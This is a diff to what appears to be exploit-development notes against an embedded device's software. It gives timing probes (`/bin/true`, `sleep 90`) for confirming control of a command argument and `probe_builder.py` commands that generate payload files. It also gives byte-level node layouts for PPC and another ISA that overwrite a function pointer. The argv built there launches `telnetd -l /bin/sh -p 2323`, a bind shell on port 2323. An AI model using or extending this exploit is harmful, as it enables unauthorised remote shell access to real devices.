@@ -48,6 +48,9 @@ No listener, no file, no beacon — the *duration* is the observable:
 | **P1** | `/bin/true` | a clean no-outage fire immediately after P0 ⇒ the command completes and returns |
 | **P2** | `sleep 90` | a **60–100 s** outage + `BootSeq + 1` ⇒ the reboot is C (blocked thread), not D |
 
+**Order matters:** if `P0` reboots the box, re-calibrate `S` before `P1`/`P2` — the band re-seeds.
+Run `P1` first on a unit where `P0` returned clean, never across a reboot.
+
 Read: `P0` long-and-recovered = we own the argument, and telnetd/wget are the only problem left.
 `P0` sub-second gap = B, wrong-but-mapped pointer. `P0` nothing = A, and the pointer is valid text
 that is not a command. `P0` reboot = D (crash escalation) → same conclusion as B.
@@ -89,17 +92,26 @@ fork/vfork → `execve(argv[0], argv, environ)`; ≤9 entries; the S2 one also d
 register — but now a wrong value fails **before** the fork, in `access()`, with a fast return, which
 is itself a clean signal.
 
+`recon/tnzm_audible/probe_builder.py` builds all of this (modes `fp`/`wrap`/`canary`, `--isa`, `--s`),
+and the four layouts below are generated and byte-checked already:
+
+```
+python3 recon/tnzm_audible/probe_builder.py --isa s2  --s <hit> --mode fp --ms 8 --out /tmp/p0.aa
+python3 recon/tnzm_audible/probe_builder.py --isa s2  --s <hit> --mode wrap           --out /tmp/w.aa
+python3 recon/tnzm_audible/probe_builder.py --isa ppc --s <hit> --mode wrap           --out /tmp/w.aa
+```
+
 PPC construction (the `[B]=V` constraint is an asset: `argv[0]` **is** `V` = node600, so put the path
 string there, before the `FN` DWORD at `+28`):
 
 ```
+node 200  { &600, &640, &643, &651, &654, 0 }     ← the argv array IS B; verified bytes
+node 640  "-l\0"   643 "/bin/sh\0"   651 "-p\0"   654 "2323\0"
 node 600  "/usr/sbin/telnetd\0"     (18 B, ends before +28)
-node 628  FN = 0x104044C0            (clobbered by nothing)
-node 700  "-l\0"  710  "/bin/sh\0"  720  "-p\0"  730  "2323\0"
-node 200  { &node600, &node700, &node710, &node720, &node730, 0 }
+node 628  FN = 0x104044C0            (clobbered by nothing; 600+19..627 pad)
 ```
-S2: `argv = { "/bin/sh", "-c", &cmd }`, argv array at `node0` (`[0]=&700s, [4]=&"_c", [8]=&cmd,
-[12]=0`), command anywhere in the free 632–6403 hole.
+S2: `argv = { &700("/bin/sh"), &708("-c"), &710(cmd), 0 }` at node0 — offsets 0/4/8/12 — and the
+command anywhere in the free 632–6403 hole (no 107-byte budget any more).
 
 **Accept** the post-fork fault: `r4`/`a1` is the notify context, and both wrappers write pipe fds
 through it. A daemon restart *after* the child has `execve`d is a pass, not a failure — the listener
